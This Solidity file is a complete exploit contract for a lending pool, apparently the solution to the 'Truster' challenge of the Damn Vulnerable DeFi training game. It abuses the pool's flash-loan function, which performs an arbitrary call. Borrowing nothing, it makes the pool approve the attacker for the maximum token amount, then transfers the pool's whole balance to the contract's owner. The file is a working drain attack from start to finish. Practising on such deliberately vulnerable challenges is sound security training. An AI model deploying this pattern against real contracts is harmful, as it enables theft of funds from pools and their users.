// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract TrusterExploit {

    TrusterLenderPool public lendPool;
    IERC20 public dvt;
    address public immutable owner;

    constructor(address _lendPool)
    {
        lendPool = TrusterLenderPool(_lendPool);
        dvt = lendPool.damnValuableToken();
        owner = msg.sender;
    }

    function drainDVTFromPool() external
    {
        bytes memory DVTCalldata = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );

        lendPool.flashLoan(0, owner, address(dvt), DVTCalldata);
        
        dvt.transferFrom(address(lendPool), owner, dvt.balanceOf(address(lendPool)));

    }

}
